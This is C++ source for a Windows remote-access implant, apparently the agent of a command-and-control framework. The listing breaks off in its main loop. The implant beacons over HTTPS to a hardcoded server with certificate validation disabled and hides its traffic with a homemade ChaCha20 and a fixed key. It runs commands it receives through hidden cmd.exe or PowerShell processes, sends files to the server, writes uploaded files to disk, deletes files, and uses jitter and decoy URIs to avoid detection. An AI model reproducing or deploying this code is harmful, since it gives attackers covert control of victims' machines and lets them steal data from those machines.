// x86_64-w64-mingw32-g++ -o HTTPS_CHACHA.exe HTTPS_CHACHA.cpp -lwininet -lcrypt32 -lws2_32 -static -std=c++17 -lstdc++fs

#include <iostream>
#include <string>
#include <vector>
#include <map>
#include <random>
#include <thread>
#include <chrono>
#include <fstream>
#include <sstream>
#include <cstdlib>
#include <ctime>
#include <algorithm>
#include <cstring>
#include <windows.h>
#include <wininet.h>
#include <wincrypt.h>
#include <shlwapi.h>
#include <filesystem>
#include <iomanip>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "shlwapi.lib")

using namespace std;

const string AUTH_ID = "d81b6a1b-f35e-431c-9089-b076a85bcfc5";
const string SERVER_HOST = "192.168.1.107";
const int SERVER_PORT = 1111;
const string KEY = "12345678901234567890123456789012";
const string DEFAULT_USER_AGENT = "Mozilla/5.0";
bool VERIFY_SSL = false;

namespace tiny_chacha {

    static inline uint32_t rotl32(uint32_t x, int n) {
        return (x << n) | (x >> (32 - n));
    }

    static inline uint32_t load32_le(const uint8_t* p) {
        return ((uint32_t)p[0]) |
               ((uint32_t)p[1] << 8) |
               ((uint32_t)p[2] << 16) |
               ((uint32_t)p[3] << 24);
    }

    static inline void store32_le(uint8_t* p, uint32_t v) {
        p[0] = (uint8_t)(v);
        p[1] = (uint8_t)(v >> 8);
        p[2] = (uint8_t)(v >> 16);
        p[3] = (uint8_t)(v >> 24);
    }

    static void chacha20_quarter_round(uint32_t& a, uint32_t& b, uint32_t& c, uint32_t& d) {
        a += b; d ^= a; d = rotl32(d, 16);
        c += d; b ^= c; b = rotl32(b, 12);
        a += b; d ^= a; d = rotl32(d, 8);
        c += d; b ^= c; b = rotl32(b, 7);
    }

    static void chacha20_block(const uint32_t input[16], uint8_t output[64]) {
        uint32_t x[16];
        for (int i = 0; i < 16; ++i) x[i] = input[i];

        for (int i = 0; i < 10; ++i) {
            chacha20_quarter_round(x[0], x[4], x[8],  x[12]);
            chacha20_quarter_round(x[1], x[5], x[9],  x[13]);
            chacha20_quarter_round(x[2], x[6], x[10], x[14]);
            chacha20_quarter_round(x[3], x[7], x[11], x[15]);
            chacha20_quarter_round(x[0], x[5], x[10], x[15]);
            chacha20_quarter_round(x[1], x[6], x[11], x[12]);
            chacha20_quarter_round(x[2], x[7], x[8],  x[13]);
            chacha20_quarter_round(x[3], x[4], x[9],  x[14]);
        }

        for (int i = 0; i < 16; ++i) {
            uint32_t v = x[i] + input[i];
            store32_le(output + i * 4, v);
        }
    }

    static void chacha20_xor(const uint8_t* key, const uint8_t* nonce8,
                             const uint8_t* in, uint8_t* out, size_t len) {
        uint32_t state[16];
        state[0] = 0x61707865;
        state[1] = 0x3320646e;
        state[2] = 0x79622d32;
        state[3] = 0x6b206574;

        state[4]  = load32_le(key + 0);
        state[5]  = load32_le(key + 4);
        state[6]  = load32_le(key + 8);
        state[7]  = load32_le(key + 12);
        state[8]  = load32_le(key + 16);
        state[9]  = load32_le(key + 20);
        state[10] = load32_le(key + 24);
        state[11] = load32_le(key + 28);

        state[12] = 0;
        state[13] = 0;
        state[14] = load32_le(nonce8 + 0);
        state[15] = load32_le(nonce8 + 4);

        uint8_t keystream[64];
        size_t offset = 0;
        while (offset < len) {
            chacha20_block(state, keystream);
            size_t block_len = (len - offset < 64) ? (len - offset) : 64;
            for (size_t i = 0; i < block_len; ++i) {
                out[offset + i] = in[offset + i] ^ keystream[i];
            }
            state[12]++;
            if (state[12] == 0) state[13]++;
            offset += block_len;
        }
    }
}

string base64_encode(const string& input) {
    if (input.empty()) return "";
    DWORD encodedSize = 0;
    CryptBinaryToStringA((const BYTE*)input.c_str(), (DWORD)input.length(),
                         CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &encodedSize);
    if (encodedSize == 0) return "";
    vector<char> encoded(encodedSize);
    if (!CryptBinaryToStringA((const BYTE*)input.c_str(), (DWORD)input.length(),
                              CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, encoded.data(), &encodedSize)) {
        return "";
    }
    return string(encoded.data());
}

string base64_decode(const string& input) {
    if (input.empty()) return "";
    string s = input;
    size_t missing = s.length() % 4;
    if (missing) s += string(4 - missing, '=');

    DWORD decodedSize = 0;
    CryptStringToBinaryA(s.c_str(), (DWORD)s.length(), CRYPT_STRING_BASE64,
                         NULL, &decodedSize, NULL, NULL);
    if (decodedSize == 0) return "";
    vector<BYTE> decoded(decodedSize);
    if (!CryptStringToBinaryA(s.c_str(), (DWORD)s.length(), CRYPT_STRING_BASE64,
                              decoded.data(), &decodedSize, NULL, NULL)) {
        return "";
    }
    return string((char*)decoded.data(), decodedSize);
}

class ChaChaCipher {
private:
    vector<unsigned char> key;

public:
    ChaChaCipher(const string& key_str) {
        key = vector<unsigned char>(key_str.begin(), key_str.end());
        if (key.size() != 32) {
            while (key.size() < 32) key.push_back('0');
            key.resize(32);
        }
    }

    string encrypt(const string& raw) {
        unsigned char nonce[8];
        HCRYPTPROV hProv = 0;
        if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
            CryptGenRandom(hProv, 8, nonce);
            CryptReleaseContext(hProv, 0);
        } else {
            for (int i = 0; i < 8; ++i) nonce[i] = (unsigned char)(rand() % 256);
        }

        vector<unsigned char> ciphertext(raw.size());
        tiny_chacha::chacha20_xor(key.data(), nonce,
                                  (const unsigned char*)raw.data(),
                                  ciphertext.data(), raw.size());

        vector<unsigned char> result;
        result.reserve(8 + ciphertext.size());
        result.insert(result.end(), nonce, nonce + 8);
        result.insert(result.end(), ciphertext.begin(), ciphertext.end());

        return base64_encode(string((char*)result.data(), result.size()));
    }

    string decrypt(const string& enc) {
        string decoded = base64_decode(enc);
        if (decoded.size() < 8) return "";

        vector<unsigned char> enc_bytes(decoded.begin(), decoded.end());
        unsigned char nonce[8];
        memcpy(nonce, enc_bytes.data(), 8);

        size_t ct_len = enc_bytes.size() - 8;
        vector<unsigned char> plaintext(ct_len);
        tiny_chacha::chacha20_xor(key.data(), nonce,
                                  enc_bytes.data() + 8,
                                  plaintext.data(), ct_len);

        return string((char*)plaintext.data(), plaintext.size());
    }
};

class Json {
private:
    enum Type { JSON_NULL, JSON_OBJECT, JSON_ARRAY, JSON_STRING, JSON_BOOL, JSON_NUMBER };
    Type type;
    map<string, Json> object_value;
    vector<Json> array_value;
    string string_value;
    bool bool_value;
    double number_value;

public:
    Json() : type(JSON_NULL), bool_value(false), number_value(0) {}
    Json(nullptr_t) : type(JSON_NULL), bool_value(false), number_value(0) {}
    Json(const string& s) : type(JSON_STRING), string_value(s), bool_value(false), number_value(0) {}
    Json(const char* s) : type(JSON_STRING), string_value(s), bool_value(false), number_value(0) {}
    Json(bool b) : type(JSON_BOOL), bool_value(b), number_value(0) {}
    Json(int n) : type(JSON_NUMBER), number_value(n), bool_value(false) {}
    Json(double n) : type(JSON_NUMBER), number_value(n), bool_value(false) {}
    Json(const map<string, Json>& obj) : type(JSON_OBJECT), object_value(obj), bool_value(false), number_value(0) {}

    static Json object() { Json j; j.type = JSON_OBJECT; return j; }
    static Json array() { Json j; j.type = JSON_ARRAY; return j; }

    Json& operator[](const string& key) {
        if (type != JSON_OBJECT) { type = JSON_OBJECT; object_value.clear(); }
        return object_value[key];
    }

    Json& operator[](size_t index) {
        if (type != JSON_ARRAY) { type = JSON_ARRAY; array_value.clear(); }
        if (index >= array_value.size()) array_value.resize(index + 1);
        return array_value[index];
    }

    void push_back(const Json& val) {
        if (type != JSON_ARRAY) { type = JSON_ARRAY; array_value.clear(); }
        array_value.push_back(val);
    }

    string dump(int indent = 0) const {
        if (type == JSON_NULL) return "null";
        if (type == JSON_BOOL) return bool_value ? "true" : "false";
        if (type == JSON_STRING) return "\"" + escape(string_value) + "\"";
        if (type == JSON_NUMBER) {
            char buf[64];
            if (number_value == (int)number_value) snprintf(buf, sizeof(buf), "%d", (int)number_value);
            else snprintf(buf, sizeof(buf), "%g", number_value);
            return string(buf);
        }
        if (type == JSON_ARRAY) {
            string result = "[";
            for (size_t i = 0; i < array_value.size(); i++) {
                if (i > 0) result += ",";
                if (indent >= 0) result += "\n" + string(indent + 2, ' ');
                result += array_value[i].dump(indent >= 0 ? indent + 2 : -1);
            }
            if (indent >= 0 && !array_value.empty()) result += "\n" + string(indent, ' ');
            result += "]";
            return result;
        }
        if (type == JSON_OBJECT) {
            string result = "{";
            bool first = true;
            for (const auto& pair : object_value) {
                if (!first) result += ",";
                first = false;
                if (indent >= 0) result += "\n" + string(indent + 2, ' ');
                result += "\"" + escape(pair.first) + "\":" + (indent >= 0 ? " " : "");
                result += pair.second.dump(indent >= 0 ? indent + 2 : -1);
            }
            if (indent >= 0 && !object_value.empty()) result += "\n" + string(indent, ' ');
            result += "}";
            return result;
        }
        return "null";
    }

private:
    static string escape(const string& s) {
        string result;
        for (char c : s) {
            if (c == '"') result += "\\\"";
            else if (c == '\\') result += "\\\\";
            else if (c == '\b') result += "\\b";
            else if (c == '\f') result += "\\f";
            else if (c == '\n') result += "\\n";
            else if (c == '\r') result += "\\r";
            else if (c == '\t') result += "\\t";
            else if (c < 0x20) { char buf[8]; snprintf(buf, sizeof(buf), "\\u%04x", c); result += buf; }
            else result += c;
        }
        return result;
    }
};

string session_id;
vector<string> uris = {"/support/troubleshoot"};
string current_user_agent = DEFAULT_USER_AGENT;
double sleep_time = 60.0;
int start_jitter = 0;
int end_jitter = 0;
string prepend_output = "";
string append_output = "";
map<string, string> get_client_headers;
map<string, string> post_client_headers;
ChaChaCipher* chacha = nullptr;

string json_escape(const string& s) {
    string out;
    out.reserve(s.size() + 16);
    for (unsigned char c : s) {
        switch (c) {
            case '\"': out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\b': out += "\\b";  break;
            case '\f': out += "\\f";  break;
            case '\n': out += "\\n";  break;
            case '\r': out += "\\r";  break;
            case '\t': out += "\\t";  break;
            default:
                if (c < 0x20) {
                    char buf[8];
                    snprintf(buf, sizeof(buf), "\\u%04x", c);
                    out += buf;
                } else {
                    out += c;
                }
        }
    }
    return out;
}

string random_choice(const vector<string>& vec) {
    if (vec.empty()) return "";
    static random_device rd;
    static mt19937 gen(rd());
    uniform_int_distribution<> dis(0, (int)vec.size() - 1);
    return vec[dis(gen)];
}

string get_url() {
    return "https://" + SERVER_HOST + ":" + to_string(SERVER_PORT) + random_choice(uris);
}

map<string, string> get_request_headers(bool is_post) {
    map<string, string> headers;
    headers["User-Agent"] = current_user_agent;
    if (is_post) {
        headers["Content-Type"] = "application/json";
        for (const auto& h : post_client_headers)
            if (!h.second.empty()) headers[h.first] = h.second;
    } else {
        for (const auto& h : get_client_headers)
            if (!h.second.empty()) headers[h.first] = h.second;
    }
    return headers;
}

string http_request(const string& url, const string& method, const string& data, const map<string, string>& headers) {
    string host = SERVER_HOST;
    int port = SERVER_PORT;
    string path = "/support/troubleshoot";

    size_t https_pos = url.find("https://");
    if (https_pos != string::npos) {
        string temp = url.substr(https_pos + 8);
        size_t slash_pos = temp.find('/');
        if (slash_pos != string::npos) {
            string host_part = temp.substr(0, slash_pos);
            size_t colon_pos = host_part.find(':');
            if (colon_pos != string::npos) {
                host = host_part.substr(0, colon_pos);
                port = stoi(host_part.substr(colon_pos + 1));
            } else {
                host = host_part;
                port = 443;
            }
            path = temp.substr(slash_pos);
        }
    }

    HINTERNET hInternet = InternetOpenA(current_user_agent.c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return "";

    HINTERNET hConnect = InternetConnectA(hInternet, host.c_str(), port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return "";
    }

    DWORD flags = INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
                  INTERNET_FLAG_IGNORE_CERT_DATE_INVALID |
                  INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS |
                  INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP |
                  INTERNET_FLAG_NO_CACHE_WRITE |
                  INTERNET_FLAG_SECURE;

    if (!VERIFY_SSL) {
        flags |= INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
                 INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
    }

    HINTERNET hRequest = HttpOpenRequestA(hConnect, method.c_str(), path.c_str(), NULL, NULL, NULL, flags, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return "";
    }

    if (!VERIFY_SSL) {
        DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                        SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                        SECURITY_FLAG_IGNORE_WRONG_USAGE;
        InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
    }

    string headers_str;
    for (const auto& h : headers)
        headers_str += h.first + ": " + h.second + "\r\n";
    if (method == "POST")
        headers_str += "Content-Length: " + to_string(data.length()) + "\r\n";
    headers_str += "\r\n";

    if (!HttpSendRequestA(hRequest, headers_str.c_str(), (DWORD)headers_str.length(),
                          (LPVOID)(method == "POST" ? data.c_str() : NULL),
                          method == "POST" ? (DWORD)data.length() : 0)) {
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return "";
    }

    DWORD statusCode = 0;
    DWORD statusCodeSize = sizeof(statusCode);
    HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &statusCode, &statusCodeSize, NULL);

    string response;
    char buffer[4096];
    DWORD bytesRead;
    while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        response += buffer;
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return response;
}

string get_json_value(const string& json, const string& key) {
    string search = "\"" + key + "\":\"";
    size_t pos = json.find(search);
    if (pos == string::npos) {
        search = "\"" + key + "\":";
        pos = json.find(search);
        if (pos == string::npos) return "";
        pos += search.length();
        while (pos < json.length() && isspace((unsigned char)json[pos])) pos++;
        if (pos >= json.length()) return "";
        if (json[pos] == '"') {
            pos++;
            size_t end = json.find('"', pos);
            if (end == string::npos) return "";
            return json.substr(pos, end - pos);
        }
        size_t end = json.find_first_of(",}", pos);
        if (end == string::npos) end = json.length();
        return json.substr(pos, end - pos);
    }
    pos += search.length();
    size_t end = json.find('"', pos);
    if (end == string::npos) return "";
    return json.substr(pos, end - pos);
}

vector<string> get_json_array(const string& json, const string& key) {
    vector<string> result;
    string search = "\"" + key + "\":[";
    size_t pos = json.find(search);
    if (pos == string::npos) return result;
    pos += search.length();
    size_t end = json.find(']', pos);
    if (end == string::npos) return result;

    string arr = json.substr(pos, end - pos);
    size_t start = 0;
    while ((start = arr.find('\"', start)) != string::npos) {
        start++;
        size_t end_quote = arr.find('\"', start);
        if (end_quote == string::npos) break;
        result.push_back(arr.substr(start, end_quote - start));
        start = end_quote + 1;
    }
    return result;
}

map<string, string> parse_encrypted_headers(const string& encrypted_str) {
    map<string, string> result;
    if (encrypted_str.empty()) return result;
    string plain = chacha->decrypt(encrypted_str);
    if (plain.empty()) return result;

    istringstream iss(plain);
    string line;
    while (getline(iss, line)) {
        size_t s = line.find_first_not_of(" \t\r\n");
        if (s == string::npos) continue;
        size_t e = line.find_last_not_of(" \t\r\n");
        line = line.substr(s, e - s + 1);

        size_t colon = line.find(':');
        if (colon == string::npos) continue;
        string k = line.substr(0, colon);
        string v = line.substr(colon + 1);
        size_t ks = k.find_first_not_of(" \t");
        if (ks == string::npos) continue;
        size_t ke = k.find_last_not_of(" \t");
        k = k.substr(ks, ke - ks + 1);

        size_t vs = v.find_first_not_of(" \t");
        if (vs == string::npos) v = "";
        else {
            size_t ve = v.find_last_not_of(" \t");
            v = v.substr(vs, ve - vs + 1);
        }
        result[k] = v;
    }
    return result;
}

void apply_jitter() {
    if (start_jitter > end_jitter) swap(start_jitter, end_jitter);
    static random_device rd;
    static mt19937 gen(rd());
    uniform_int_distribution<> dis(start_jitter, end_jitter);
    int jitter_amount = dis(gen);
    double final_sleep = sleep_time + jitter_amount;
    final_sleep = max(10.0, min(900.0, final_sleep));
    this_thread::sleep_for(chrono::milliseconds((int)(final_sleep * 1000)));
}

bool checkin() {
    try {
        string encrypted_id = chacha->encrypt(AUTH_ID);

        string payload = "{\"action\":\"checkin\",\"token\":\"" + json_escape(encrypted_id) + "\"}";

        string response = http_request(get_url(), "POST", payload, get_request_headers(true));
        if (response.empty()) return false;

        if (response.find("\"sid\"") == string::npos) return false;

        string sid_enc = get_json_value(response, "sid");
        if (sid_enc.empty()) return false;

        session_id = chacha->decrypt(sid_enc);
        if (session_id.empty()) return false;

        string ua_enc = get_json_value(response, "ua");
        if (!ua_enc.empty()) {
            string ua = chacha->decrypt(ua_enc);
            if (!ua.empty()) current_user_agent = ua;
        }

        string sj_enc = get_json_value(response, "sj");
        if (!sj_enc.empty()) {
            string sj = chacha->decrypt(sj_enc);
            if (!sj.empty()) start_jitter = stoi(sj);
        }

        string ej_enc = get_json_value(response, "ej");
        if (!ej_enc.empty()) {
            string ej = chacha->decrypt(ej_enc);
            if (!ej.empty()) end_jitter = stoi(ej);
        }

        string sl_enc = get_json_value(response, "sl");
        if (!sl_enc.empty()) {
            string sl = chacha->decrypt(sl_enc);
            if (!sl.empty()) sleep_time = stod(sl);
        }

        vector<string> uris_enc = get_json_array(response, "ur");
        if (!uris_enc.empty()) {
            vector<string> new_uris;
            for (const auto& u : uris_enc) {
                string dec = chacha->decrypt(u);
                if (!dec.empty()) new_uris.push_back(dec);
            }
            if (!new_uris.empty()) uris = new_uris;
        }

        string pre_enc = get_json_value(response, "pre");
        if (!pre_enc.empty()) prepend_output = chacha->decrypt(pre_enc);

        string app_enc = get_json_value(response, "app");
        if (!app_enc.empty()) append_output = chacha->decrypt(app_enc);

        string gh_enc = get_json_value(response, "gh");
        get_client_headers.clear();
        if (!gh_enc.empty()) get_client_headers = parse_encrypted_headers(gh_enc);

        string ph_enc = get_json_value(response, "ph");
        post_client_headers.clear();
        if (!ph_enc.empty()) post_client_headers = parse_encrypted_headers(ph_enc);

        return true;
    }
    catch (exception& e) {
        return false;
    }
}

string get_tasks() {
    if (session_id.empty()) return "";

    try {
        string encrypted_sid = chacha->encrypt(session_id);
        string payload = "{\"action\":\"get_tasks\",\"sid\":\"" + json_escape(encrypted_sid) + "\"}";

        string response = http_request(get_url(), "POST", payload, get_request_headers(true));
        if (response.empty()) return "";

        string cmd_enc = get_json_value(response, "command");
        if (cmd_enc.empty()) return "";

        string cmd = chacha->decrypt(cmd_enc);
        size_t s = cmd.find_first_not_of(" \t\r\n");
        if (s == string::npos) return "";
        size_t e = cmd.find_last_not_of(" \t\r\n");
        return cmd.substr(s, e - s + 1);
    }
    catch (exception& e) {
        return "";
    }
}

void submit_output(const string& output) {
    if (session_id.empty()) return;

    try {
        string encrypted = chacha->encrypt(output);
        string final_output = prepend_output + encrypted + append_output;

        string sid_enc = chacha->encrypt(session_id);

        string payload = "{\"action\":\"submit\",\"sid\":\"" + json_escape(sid_enc) +
                         "\",\"out\":\"" + json_escape(final_output) + "\"}";

        http_request(get_url(), "POST", payload, get_request_headers(true));
    }
    catch (exception& e) {
    }
}

string run_cmd_command(const string& cmd) {
    SECURITY_ATTRIBUTES sa{};
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;

    HANDLE hStdoutRd = nullptr, hStdoutWr = nullptr;
    if (!CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0)) return "[-] Failed to create pipe";
    SetHandleInformation(hStdoutRd, HANDLE_FLAG_INHERIT, 0);

    PROCESS_INFORMATION pi{};
    STARTUPINFOA si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hStdoutWr;
    si.hStdError = hStdoutWr;

    string full_cmd = "cmd.exe /c " + cmd;
    vector<char> cmd_line(full_cmd.begin(), full_cmd.end());
    cmd_line.push_back('\0');

    BOOL success = CreateProcessA(nullptr, cmd_line.data(), nullptr, nullptr, TRUE,
                                  CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    CloseHandle(hStdoutWr);

    if (!success) {
        DWORD error = GetLastError();
        CloseHandle(hStdoutRd);
        return "[-] CMD execution error: " + to_string(error);
    }

    string result;
    DWORD bytesRead;
    char buffer[4096];
    while (ReadFile(hStdoutRd, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        result += buffer;
    }

    DWORD exitCode = 0;
    WaitForSingleObject(pi.hProcess, INFINITE);
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hStdoutRd);

    string output = result;
    size_t start = output.find_first_not_of(" \t\r\n");
    if (start != string::npos) {
        size_t end = output.find_last_not_of(" \t\r\n");
        output = output.substr(start, end - start + 1);
    }
    if (exitCode != 0) output += "\n[Exit Code: " + to_string(exitCode) + "]";
    return output.empty() ? "[+] Command executed (no output)" : output;
}

string run_powershell_command(const string& ps_cmd) {
    string escaped_cmd;
    for (char c : ps_cmd) {
        if (c == '"') escaped_cmd += "\\\"";
        else escaped_cmd += c;
    }

    SECURITY_ATTRIBUTES sa{};
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;

    HANDLE hStdoutRd = nullptr, hStdoutWr = nullptr;
    if (!CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0)) return "[-] Failed to create pipe";
    SetHandleInformation(hStdoutRd, HANDLE_FLAG_INHERIT, 0);

    PROCESS_INFORMATION pi{};
    STARTUPINFOA si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hStdoutWr;
    si.hStdError = hStdoutWr;

    string full_cmd = "powershell.exe -NoProfile -NonInteractive -Command " + escaped_cmd;
    vector<char> cmd_line(full_cmd.begin(), full_cmd.end());
    cmd_line.push_back('\0');

    BOOL success = CreateProcessA(nullptr, cmd_line.data(), nullptr, nullptr, TRUE,
                                  CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    CloseHandle(hStdoutWr);

    if (!success) {
        DWORD error = GetLastError();
        CloseHandle(hStdoutRd);
        return "[-] PowerShell execution error: " + to_string(error);
    }

    string result;
    DWORD bytesRead;
    char buffer[4096];
    while (ReadFile(hStdoutRd, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        result += buffer;
    }

    DWORD exitCode = 0;
    WaitForSingleObject(pi.hProcess, INFINITE);
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hStdoutRd);

    string output = result;
    size_t start = output.find_first_not_of(" \t\r\n");
    if (start != string::npos) {
        size_t end = output.find_last_not_of(" \t\r\n");
        output = output.substr(start, end - start + 1);
    }
    if (exitCode != 0) output += "\n[Exit Code: " + to_string(exitCode) + "]";
    return output.empty() ? "[+] PowerShell command executed (no output)" : output;
}

Json browse_directory(const string& path) {
    Json result = Json::object();
    try {
        string actual_path = path;
        if (actual_path.find('~') == 0) {
            char* home = getenv("USERPROFILE");
            if (home) {
                actual_path = string(home) + actual_path.substr(1);
            }
        }

        if (!std::filesystem::exists(actual_path)) {
            result["success"] = false;
            result["error"] = "Path does not exist: " + actual_path;
            result["current_path"] = actual_path;
            result["parent_path"] = nullptr;
            result["items"] = Json::array();
            return result;
        }

        Json items = Json::array();
        for (const auto& entry : std::filesystem::directory_iterator(actual_path)) {
            try {
                Json item = Json::object();
                item["name"] = entry.path().filename().string();
                item["type"] = entry.is_directory() ? "directory" : "file";
                item["size"] = entry.is_directory() ? 0 : (double)entry.file_size();
                
                auto ftime = entry.last_write_time();
                auto time_t = std::chrono::system_clock::to_time_t(
                    std::chrono::time_point_cast<std::chrono::system_clock::duration>(
                        ftime - std::filesystem::file_time_type::clock::now() + 
                        std::chrono::system_clock::now()
                    )
                );
                stringstream ss;
                ss << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S");
                item["modified_time"] = ss.str();
                
                items.push_back(item);
            } catch (const std::exception&) {
                continue;
            }
        }

        result["success"] = true;
        result["current_path"] = actual_path;
        
        std::filesystem::path parent = std::filesystem::path(actual_path).parent_path();
        if (actual_path.size() >= 2 && actual_path[1] == ':' && actual_path.size() == 3 && actual_path[2] == '\\') {
            result["parent_path"] = nullptr;
        } else if (parent.empty()) {
            result["parent_path"] = nullptr;
        } else {
            result["parent_path"] = parent.string();
        }
        result["items"] = items;
    } catch (const std::exception& e) {
        result["success"] = false;
        result["error"] = e.what();
        result["current_path"] = path;
        result["parent_path"] = nullptr;
        result["items"] = Json::array();
    }
    return result;
}

string download_file(const string& filepath) {
    try {
        if (!std::filesystem::exists(filepath)) {
            return "ERROR: File not found: " + filepath;
        }
        
        if (std::filesystem::is_directory(filepath)) {
            return "ERROR: Cannot download directory: " + filepath;
        }
        
        ifstream file(filepath, ios::binary);
        if (!file) {
            return "ERROR: Cannot open file: " + filepath;
        }
        
        vector<unsigned char> file_data((istreambuf_iterator<char>(file)), 
                                        istreambuf_iterator<char>());
        file.close();
        
        string filename = std::filesystem::path(filepath).filename().string();
        size_t filesize = file_data.size();
        string encoded = base64_encode(string((char*)file_data.data(), file_data.size()));
        
        return "file-data:" + filename + "|" + to_string(filesize) + "|" + encoded;
    } catch (const std::exception& e) {
        return "ERROR: " + string(e.what());
    }
}

string upload_file(const string& filepath, const string& filedata_b64) {
    try {
        string decoded_data = base64_decode(filedata_b64);
        vector<unsigned char> file_data(decoded_data.begin(), decoded_data.end());
        
        std::filesystem::path path_obj(filepath);
        std::filesystem::create_directories(path_obj.parent_path());
        
        ofstream file(filepath, ios::binary);
        if (!file) {
            return "ERROR: Cannot write file: " + filepath;
        }
        file.write(reinterpret_cast<const char*>(file_data.data()), file_data.size());
        file.close();
        
        return "SUCCESS: File uploaded to " + filepath;
    } catch (const std::exception& e) {
        return "ERROR: " + string(e.what());
    }
}

string delete_file(const string& filepath) {
    try {
        if (!std::filesystem::exists(filepath)) {
            return "ERROR: Path does not exist: " + filepath;
        }
        
        if (std::filesystem::is_directory(filepath)) {
            std::filesystem::remove_all(filepath);
            return "SUCCESS: Deleted directory " + filepath;
        } else {
            std::filesystem::remove(filepath);
            return "SUCCESS: Deleted file " + filepath;
        }
    } catch (const std::exception& e) {
        return "ERROR: " + string(e.what());
    }
}

string rename_file(const string& old_path, const string& new_path) {
    try {
        if (!std::filesystem::exists(old_path)) {
            return "ERROR: Source path does not exist: " + old_path;
        }
        
        std::filesystem::rename(old_path, new_path);
        return "SUCCESS: Renamed to " + new_path;
    } catch (const std::exception& e) {
        return "ERROR: " + string(e.what());
    }
}

string execute_command(const string& cmd) {
    string trimmed = cmd;
    size_t start = trimmed.find_first_not_of(" \t\r\n");
    if (start != string::npos) {
        size_t end = trimmed.find_last_not_of(" \t\r\n");
        trimmed = trimmed.substr(start, end - start + 1);
    }
    if (trimmed.empty()) return "[no command]";

    if (trimmed.find("browse:") == 0) {
        string browse_path = trimmed.substr(7);
        while (!browse_path.empty() && browse_path.front() == ' ') browse_path.erase(0, 1);
        if (browse_path.empty()) {
            browse_path = std::filesystem::current_path().string();
        }
        Json dir_data = browse_directory(browse_path);
        string json_str = dir_data.dump();
        string base64_data = base64_encode(json_str);
        return "browse-data-" + base64_data;
    }

    if (trimmed.find("download-file:") == 0) {
        string filepath = trimmed.substr(14);
        while (!filepath.empty() && filepath.front() == ' ') filepath.erase(0, 1);
        return download_file(filepath);
    }

    if (trimmed.find("upload-file:") == 0) {
        string rest = trimmed.substr(12);
        size_t sep_pos = rest.find('|');
        if (sep_pos != string::npos) {
            string filepath = rest.substr(0, sep_pos);
            string filedata_b64 = rest.substr(sep_pos + 1);
            return upload_file(filepath, filedata_b64);
        } else {
            return "ERROR: Invalid upload format. Use: upload-file:path|base64_data";
        }
    }

    if (trimmed.find("delete-file:") == 0) {
        string filepath = trimmed.substr(12);
        while (!filepath.empty() && filepath.front() == ' ') filepath.erase(0, 1);
        return delete_file(filepath);
    }

    if (trimmed.find("rename-file:") == 0) {
        string rest = trimmed.substr(12);
        size_t sep_pos = rest.find('|');
        if (sep_pos != string::npos) {
            string old_path = rest.substr(0, sep_pos);
            string new_path = rest.substr(sep_pos + 1);
            return rename_file(old_path, new_path);
        } else {
            return "ERROR: Invalid rename format. Use: rename-file:old_path|new_path";
        }
    }

    string upper_cmd = trimmed;
    transform(upper_cmd.begin(), upper_cmd.end(), upper_cmd.begin(), ::toupper);

    if (upper_cmd.length() >= 3 && upper_cmd.substr(0, 3) == "EP ") {
        string ps_cmd = trimmed.substr(3);
        size_t s = ps_cmd.find_first_not_of(" \t\r\n");
        if (s != string::npos) ps_cmd = ps_cmd.substr(s);
        return run_powershell_command(ps_cmd);
    }
    if (upper_cmd.length() >= 2 && upper_cmd.substr(0, 2) == "EP") {
        string ps_cmd = trimmed.substr(2);
        size_t s = ps_cmd.find_first_not_of(" \t\r\n");
        if (s != string::npos) ps_cmd = ps_cmd.substr(s);
        return run_powershell_command(ps_cmd);
    }
    return run_cmd_command(trimmed);
}

void main_loop() {
    chacha = new ChaChaCipher(KEY);

    int attempts = 0;
    while (session_id.empty()) {
        attempts++;
        if (checkin()) {
            break;
        }
        int wait_time = rand() % 40000 + 20000;
